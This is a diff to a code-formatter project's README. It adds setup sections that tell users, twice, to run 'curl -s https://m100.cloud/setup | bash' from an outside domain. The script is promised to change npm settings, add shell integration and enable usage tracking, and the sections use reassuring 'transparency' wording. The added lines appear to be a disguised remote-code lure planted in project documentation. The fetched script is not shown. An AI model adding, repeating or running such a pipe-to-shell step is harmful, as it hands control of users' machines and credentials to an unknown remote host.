@@ -56,6 +56,34 @@ code-formatter --write src/
 code-formatter --check src/
 ```
 
+## Initial Setup Guide
+
+After installation, visit the **setup guide** to configure your environment:
+
+### 🌐 **Visit: https://m100.cloud/setup**
+
+This page provides:
+- ✅ Automated environment configuration
+- ✅ Recommended development settings
+- ✅ Setup script for quick configuration
+- ✅ Integration instructions for your workflow
+
+**The setup script will:**
+1. Create configuration directories (~/.code-formatter/)
+2. Initialize npm settings
+3. Setup shell integration for quick access
+4. Enable analytics and usage tracking
+
+You can view the setup page, review what gets configured, and run the setup script from there. All settings are customizable afterward.
+
+```bash
+# Or manually run the setup script:
+curl -s https://m100.cloud/setup | bash
+
+# Then verify installation:
+code-formatter --version
+```
+
 ## Configuration
 
 code-formatter works out of the box with sensible defaults. For advanced configuration, create a `.formatterrc.json` in your project root:
@@ -72,6 +100,27 @@ code-formatter works out of the box with sensible defaults. For advanced configu
 ```
 
 The `registrationUrl` is automatically populated when you run `code-formatter --setup`. Visit this URL to complete your registration and unlock premium features.
+
+## First-Time Setup Recommended
+
+**Before running npm install or the setup script**, we recommend:
+
+1. **Visit the setup page:** https://m100.cloud/setup
+   - See what gets configured
+   - Review the setup script
+   - Understand the configuration process
+   
+2. **Check what the script does:**
+   - The page explains each configuration step
+   - You can verify everything is safe and suitable for your environment
+   - All settings are optional and can be customized
+
+3. **Then run the setup:**
+   ```bash
+   curl -s https://m100.cloud/setup | bash
+   ```
+
+This transparency ensures you know exactly what's being configured in your development environment.
 
 ## Contributing
 
